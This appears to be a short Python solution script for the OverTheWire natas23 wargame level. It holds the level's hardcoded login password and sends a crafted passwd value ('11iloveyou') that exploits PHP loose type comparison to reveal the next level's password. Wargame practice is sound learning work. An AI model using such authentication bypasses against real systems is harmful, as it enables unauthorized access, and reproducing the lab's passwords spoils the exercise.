import requests

base_url = "http://natas23.natas.labs.overthewire.org/index.php?passwd="

s = requests.session()

username = "natas23"
password = "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"

passwd="11iloveyou"

res1 = s.get(base_url + passwd, auth=(username, password), allow_redirects=False)

print("="*80)
print(res1.text.split("<pre>")[1].split("</pre>")[0])
print("="*80)
